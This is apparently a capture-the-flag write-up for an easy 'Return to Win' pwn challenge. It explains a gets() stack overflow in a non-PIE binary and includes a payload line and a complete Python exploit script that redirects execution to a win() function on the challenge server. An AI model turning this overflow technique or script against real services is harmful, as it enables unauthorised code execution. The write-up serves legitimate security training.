---
title: "Return to Win"
category: "Pwn"
tags: ["stack-buffer-overflow", "gets", "ret2win", "non-pie"]
solve_date: "2026-10-09"
language: "en"
---

# Return to Win

**Flag:** `OWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}`
**Service:** `nc 145.239.142.129 1340`. **Artifact:** `ret2win.zip` (2825 B), containing `main.out` (16248 B, 64-bit ELF).

## Challenge

The binary is provided (Easy, 100 points). It prints `Hi, what's your name?`, reads one string with `gets()`, then prints a greeting. The binary already contains a `win()` function that reads and prints `flag.txt`. The goal is to redirect execution into `win()` inside the process served by the remote instance.

## Analysis

`readelf -h main.out` reports `Type: EXEC (Executable file)` and `r2 -q -c "i~type,pic" main.out` reports `pic false`, so function addresses are constants and no leak step is needed. The checksec invocation in the working session produced no output, so beyond the non-PIE conclusion no further guard state is claimed from checksec; `main.out` itself has no reference to `__stack_chk_fail` (`readelf -sW main.out | grep -c __stack_chk_fail` returns `0`), meaning `hello()` ends with `ret` without a canary check.

Symbol table:

```text
25  0x000011f6 0x004011f6 GLOBAL FUNC   104      hello
33  0x0000125e 0x0040125e GLOBAL FUNC   146      win
```

`hello()` at `0x4011f6`:

```text
0x004011fe  4883ec10     sub rsp, 0x10
0x00401220  488d45f6     lea rax, [rbp - 0xa]
0x0040122c  e89feffff    call sym.imp.gets
```

The buffer starts at `rbp-0xa` and the return address sits at `rbp+8`, so 0xa + 8 = 18 bytes have to be filled. `gets()` has no length limit, so the overwrite is fully under the caller's control.

`win()` at `0x40125e` calls `fopen("flag.txt", "r")`, reads with `fgets` into a buffer at `rbp-0x50`, prints it through `printf("%s")` and then `exit`. The `fopen`-failure branch prints `Please create 'flag.txt' in this directory with your own debugging flag.`; the zip carries no `flag.txt`, so the flag only exists on the remote instance.

## Solution

Send 18 filler bytes followed by the 8-byte little-endian address of `win()` — 26 bytes of overwrite — and terminate with `\n` so `gets()` stops reading and `hello()` returns straight into `win`:

```python
payload = b"A" * 18 + struct.pack("<Q", 0x40125e) + b"\n"
```

The three low address bytes (`5e 12 40`) reappear in the greeting because `printf("Hello, %s!\n")` runs before the `ret` and prints up to the first NUL; the five remaining `00` bytes are exactly the unused high part of a 48-bit address in a non-PIE image, so no null-avoidance technique is required.

Two runs produced the same response:

```text
[*] after payload: b'Hello, AAAAAAAAAAAAAAAAAA^\x12@!\nOWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}'
```

## Result

```text
OWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}
```

The flag was read directly from the challenge service. No submission response recorded.

## Reproduce

Requires Python 3 (`socket`, `struct`), `unzip`, and optionally `binutils`/`radare2` for the static checks. pwntools is not used.

```console
$ unzip ret2win.zip
$ readelf -h main.out | grep Type
$ readelf -sW main.out | grep -c __stack_chk_fail
$ r2 -q -c "is" main.out | grep -E "hello|win"
```

Save the block below as `exploit.py` and run `python exploit.py`; the script only connects to the remote, so it does not need to sit next to the binary.

```python
import socket, struct, sys

HOST, PORT = "145.239.142.129", 1340
WIN = 0x40125e
OFF = 0xa + 8  # buffer at rbp-0xa, return addr at rbp+8

payload = b"A" * OFF + struct.pack("<Q", WIN) + b"\n"

s = socket.create_connection((HOST, PORT), timeout=15)
s.settimeout(15)
data = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
        if b"name" in data:
            break
except socket.timeout:
    pass
print("[+] prompt:", repr(data))
s.sendall(payload)
out = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
except socket.timeout:
    pass
s.close()
print("[*] after payload:", repr(out))
```

The address `0x40125e` comes from the shipped `main.out`; if the service ships a different binary, re-read the symbol table before running.
